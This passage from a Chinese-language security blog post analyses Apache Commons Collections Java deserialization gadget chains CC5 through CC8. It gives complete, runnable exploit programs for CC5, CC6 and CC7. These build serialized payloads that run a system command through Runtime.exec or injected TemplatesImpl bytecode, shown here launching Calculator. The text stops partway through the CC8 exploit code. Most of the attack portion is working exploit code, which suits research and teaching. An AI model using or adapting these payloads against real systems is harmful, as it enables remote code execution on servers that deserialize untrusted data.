<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">getKey</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.key;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">getValue</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.map.get(<span class="keyword">this</span>.key);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这里可以看到map.get，那就和LazyMap下的get方法很相似了；直接用这两个类代替之前的代理方法触发invoke然后触发get的点，达到最后加载恶意的class去进行rce；</p>
<h2 id="exp如下："><a href="#exp如下：" class="headerlink" title="exp如下："></a>exp如下：</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javassist.ClassClassPath;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.xalan.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CC5</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">s1mple</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        String lazymap = <span class="string">&quot;org.apache.commons.collections.map.LazyMap&quot;</span>;</span><br><span class="line">        String AbstractTranslet = <span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>;</span><br><span class="line">        String TemplatesImpl = <span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>;</span><br><span class="line">        ClassPool classpool = ClassPool.getDefault();</span><br><span class="line">        classpool.insertClassPath(<span class="keyword">new</span> ClassClassPath(AbstractTranslet.class));</span><br><span class="line">        classpool.insertClassPath(<span class="keyword">new</span> ClassClassPath(s1mple.class));</span><br><span class="line">        classpool.insertClassPath(<span class="keyword">new</span> ClassClassPath(s1mple.class));</span><br><span class="line">        CtClass s2mple = classpool.get(s1mple.class.getName());</span><br><span class="line">        CtClass s3mple = classpool.get(Class.forName(AbstractTranslet).getName());</span><br><span class="line">        s2mple.setSuperclass(s3mple);</span><br><span class="line">        s2mple.makeClassInitializer().insertAfter(<span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;/System/Applications/Calculator.app/Contents/MacOS/Calculator\&quot;);&quot;</span>);</span><br><span class="line">        <span class="keyword">byte</span>[] bt = s2mple.toBytecode();</span><br><span class="line">        Class templatesimpl = Class.forName(TemplatesImpl);</span><br><span class="line">        Constructor constructor= templatesimpl.getConstructor();</span><br><span class="line">        Object temp = constructor.newInstance();</span><br><span class="line"></span><br><span class="line">        Field name = templatesimpl.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        name.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        name.set(temp,<span class="string">&quot;s1mple_hack&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Field bytecode = templatesimpl.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecode.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        bytecode.set(temp,<span class="keyword">new</span> <span class="keyword">byte</span>[][]&#123;bt&#125;);</span><br><span class="line"></span><br><span class="line">        HashMap hash = <span class="keyword">new</span> HashMap&lt;String,String&gt;();</span><br><span class="line"></span><br><span class="line">        Map hashmap = (Map)hash;</span><br><span class="line">        Class lazy = Class.forName(lazymap);</span><br><span class="line">        Constructor lazycon = lazy.getDeclaredConstructor(Map.class,Transformer.class);</span><br><span class="line">        lazycon.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;<span class="keyword">new</span> ConstantTransformer(temp),<span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;newTransformer&quot;</span>,<span class="keyword">null</span>,<span class="keyword">null</span>)&#125;;</span><br><span class="line">        Transformer chained = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line">        Object lazyss = lazycon.newInstance(hashmap,chained);<span class="comment">//LazyMap实力化对象；</span></span><br><span class="line">        Map lazyMap = (Map)lazyss;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        Class bad =  javax.management.BadAttributeValueExpException.class;</span><br><span class="line">        Field val = bad.getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">        val.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        BadAttributeValueExpException as = <span class="keyword">new</span> BadAttributeValueExpException(<span class="string">&quot;s1mple&quot;</span>);</span><br><span class="line">        TiedMapEntry tied = <span class="keyword">new</span> TiedMapEntry(lazyMap,<span class="string">&quot;s1mple&quot;</span>);</span><br><span class="line">        val.set(as,tied);</span><br><span class="line">        ObjectOutputStream exp = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">&quot;c.bin&quot;</span>));</span><br><span class="line">        exp.writeObject(as);</span><br><span class="line">        ObjectInputStream test = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="string">&quot;c.bin&quot;</span>));</span><br><span class="line">        test.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>不太难理解；</p>
<h2 id="CommonsCollections6"><a href="#CommonsCollections6" class="headerlink" title="CommonsCollections6"></a>CommonsCollections6</h2><p>看到了5的用法，在6中也可以进行类似的用法，将最后rce的触发点换成之前Runtime下的exec方法触发；也可导致rce；没什么好说的了；限制条件也和之前的那个链一样，SecurityManager未设置的时候可以触发；</p>
<h2 id="exp如下"><a href="#exp如下" class="headerlink" title="exp如下"></a>exp如下</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CC6</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        String lazymap = <span class="string">&quot;org.apache.commons.collections.map.LazyMap&quot;</span>;</span><br><span class="line">        String chain = <span class="string">&quot;org.apache.commons.collections.functors.ChainedTransformer&quot;</span>;</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(java.lang.Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> Class[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> Class[]&#123;&#125;&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>, <span class="keyword">new</span> Object[]&#123;&#125;&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> Class[]&#123;String[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="keyword">new</span> String[]&#123;<span class="string">&quot;/System/Applications/Calculator.app/Contents/MacOS/Calculator&quot;</span>&#125;&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line">        HashMap hash = <span class="keyword">new</span> HashMap&lt;String,String&gt;();</span><br><span class="line"></span><br><span class="line">        Map hashmap = (Map)hash;</span><br><span class="line">        Class lazy = Class.forName(lazymap);</span><br><span class="line">        Constructor lazycno = lazy.getDeclaredConstructor(Map.class,Transformer.class);</span><br><span class="line">        lazycno.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        ChainedTransformer chains = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line">        Transformer chs = (Transformer)chains;</span><br><span class="line">        Object lazyMap = lazycno.newInstance(hashmap,chs);</span><br><span class="line">        Map la = (Map)lazyMap;</span><br><span class="line"></span><br><span class="line">        Class bad =  javax.management.BadAttributeValueExpException.class;</span><br><span class="line">        Field val = bad.getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">        val.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        BadAttributeValueExpException as = <span class="keyword">new</span> BadAttributeValueExpException(<span class="string">&quot;s1mple&quot;</span>);</span><br><span class="line">        TiedMapEntry tied = <span class="keyword">new</span> TiedMapEntry(la,<span class="string">&quot;s1mple&quot;</span>);</span><br><span class="line">        val.set(as,tied);</span><br><span class="line">        ObjectOutputStream out = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">&quot;exp.bin&quot;</span>));</span><br><span class="line">        out.writeObject(as);</span><br><span class="line">        ObjectInputStream test = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="string">&quot;exp.bin&quot;</span>));</span><br><span class="line">        test.readObject();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>弹出计算器success；</p>
<h2 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h2><p>其实反观这几个链条，都是利用了ChainedTransformer下的for循环去进行调用，其中也不乏用到了InvokerTransformer下的方法；然而org.apache.commons.collections4.functors.InvokerTransformer的transform和org.apache.commons.collections.functors.InvokerTransformer是差不多一样的，我们只需要将这个变换一下就又可以多出几个链条，但是也会受相应的版本的限制；不过这些也没什么分析的意义，在这里就不分析了；点一下；</p>
<h2 id="CommonsCollections7"><a href="#CommonsCollections7" class="headerlink" title="CommonsCollections7"></a>CommonsCollections7</h2><p>先来看下调用栈；</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Gadget chain:</span><br><span class="line">    java.io.ObjectInputStream.readObject()</span><br><span class="line">        java.util.HashSet.readObject()</span><br><span class="line">            java.util.HashMap.put()</span><br><span class="line">            java.util.HashMap.hash()</span><br><span class="line">                org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()</span><br><span class="line">                org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()</span><br><span class="line">                    org.apache.commons.collections.map.LazyMap.get()</span><br><span class="line">                        org.apache.commons.collections.functors.ChainedTransformer.transform()</span><br><span class="line">                        org.apache.commons.collections.functors.InvokerTransformer.transform()</span><br><span class="line">                        java.lang.reflect.Method.invoke()</span><br><span class="line">                            java.lang.Runtime.exec()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这里看到是在HashSet下进行反序列化，然后到HashMap下进行hashCode的跳转；追溯下函数：HashMap下的hash方法；但是在HashMap下已经存在了readObject方法，所以这里也就不去挂到HashSet类下了；直接HashMap走起；</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> <span class="title">hash</span><span class="params">(Object key)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> h;</span><br><span class="line">    <span class="keyword">return</span> (key == <span class="keyword">null</span>) ? <span class="number">0</span> : (h = key.hashCode()) ^ (h &gt;&gt;&gt; <span class="number">16</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>可以看到这里调用了key对象下的hashCode方法；在TiedMapEntry类下也存在hashCode函数，追溯一下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">hashCode</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    Object value = <span class="keyword">this</span>.getValue();</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">this</span>.getKey() == <span class="keyword">null</span> ? <span class="number">0</span> : <span class="keyword">this</span>.getKey().hashCode()) ^ (value == <span class="keyword">null</span> ? <span class="number">0</span> : value.hashCode());</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>可以看到也调用了getValue和getKey方法；是否看到了上一个链条的影子？那其实也没有什么悬念了；</p>
<p>直接exp吧；不是很难理解，基本就是换了下前面的链条，后面的exec还是调用Runtime下的，其实也可转为加载恶意class去进行rce；其实也是换汤不换药；</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CC7</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchMethodException, IllegalAccessException, InvocationTargetException, InstantiationException, IOException </span>&#123;</span><br><span class="line">        String lazymap = <span class="string">&quot;org.apache.commons.collections.map.LazyMap&quot;</span>;</span><br><span class="line">        String chain = <span class="string">&quot;org.apache.commons.collections.functors.ChainedTransformer&quot;</span>;</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(java.lang.Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> Class[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> Class[]&#123;&#125;&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>, <span class="keyword">new</span> Object[]&#123;&#125;&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> Class[]&#123;String[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="keyword">new</span> String[]&#123;<span class="string">&quot;/System/Applications/Calculator.app/Contents/MacOS/Calculator&quot;</span>&#125;&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line">        ChainedTransformer chains = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        HashMap hashmap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        Map hash = (Map)hashmap;</span><br><span class="line">        Class lazy = Class.forName(lazymap);</span><br><span class="line">        Constructor lazyconstructor = lazy.getDeclaredConstructor(Map.class,Transformer.class);</span><br><span class="line">        lazyconstructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        Object lazyMap =lazyconstructor.newInstance(hash,chains);</span><br><span class="line">        Map lazys = (Map)lazyMap;</span><br><span class="line"></span><br><span class="line">        HashMap hashmaps = <span class="keyword">new</span> HashMap&lt;Object,String&gt;();</span><br><span class="line">        TiedMapEntry  tied = <span class="keyword">new</span> TiedMapEntry(lazys,<span class="string">&quot;s1mple&quot;</span>);</span><br><span class="line"></span><br><span class="line">        hashmaps.put(tied,<span class="string">&quot;s1mple&quot;</span>);</span><br><span class="line">        ObjectOutputStream out = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">&quot;exp.ser&quot;</span>));</span><br><span class="line">        out.writeObject(hashmaps);</span><br><span class="line"></span><br><span class="line">        ObjectInputStream test = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="string">&quot;exp.ser&quot;</span>));</span><br><span class="line">        test.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="CommonsCollections8"><a href="#CommonsCollections8" class="headerlink" title="CommonsCollections8"></a>CommonsCollections8</h2><p>先来看看调用栈；</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Payload method chain:</span><br><span class="line">    java.util.Hashtable.readObject</span><br><span class="line">    java.util.Hashtable.reconstitutionPut</span><br><span class="line">    org.apache.commons.collections.map.AbstractMapDecorator.equals</span><br><span class="line">    java.util.AbstractMap.equals</span><br><span class="line">    org.apache.commons.collections.map.LazyMap.get</span><br><span class="line">    org.apache.commons.collections.functors.ChainedTransformer.transform</span><br><span class="line">    org.apache.commons.collections.functors.InvokerTransformer.transform</span><br><span class="line">    java.lang.reflect.Method.invoke</span><br><span class="line">    sun.reflect.DelegatingMethodAccessorImpl.invoke</span><br><span class="line">    sun.reflect.NativeMethodAccessorImpl.invoke</span><br><span class="line">    sun.reflect.NativeMethodAccessorImpl.invoke0</span><br><span class="line">    java.lang.Runtime.exec</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>不同于这个调用栈，我简单挖掘并采用一种新的方式去进行调用；直接看到hashtable类下有一个put方法，简单追溯下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> V <span class="title">put</span><span class="params">(K key, V value)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// Make sure the value is not null</span></span><br><span class="line">    <span class="keyword">if</span> (value == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> NullPointerException();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Makes sure the key is not already in the hashtable.</span></span><br><span class="line">    Entry&lt;?,?&gt; tab[] = table;</span><br><span class="line">    <span class="keyword">int</span> hash = key.hashCode();</span><br><span class="line">    <span class="keyword">int</span> index = (hash &amp; <span class="number">0x7FFFFFFF</span>) % tab.length;</span><br><span class="line">    <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">    Entry&lt;K,V&gt; entry = (Entry&lt;K,V&gt;)tab[index];</span><br><span class="line">    <span class="keyword">for</span>(; entry != <span class="keyword">null</span> ; entry = entry.next) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((entry.hash == hash) &amp;&amp; entry.key.equals(key)) &#123;</span><br><span class="line">            V old = entry.value;</span><br><span class="line">            entry.value = value;</span><br><span class="line">            <span class="keyword">return</span> old;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    addEntry(hash, key, value, index);</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>非常巧的是这个方法里也是调用到了hashCode方法；而且是任意类下；这里可以直接将key赋值为TiedMapEntry实例；然后去调用其下的hashCode去触发getKey和getValue方法，接着就是常规的利用链了；</p>
<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CC8</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> 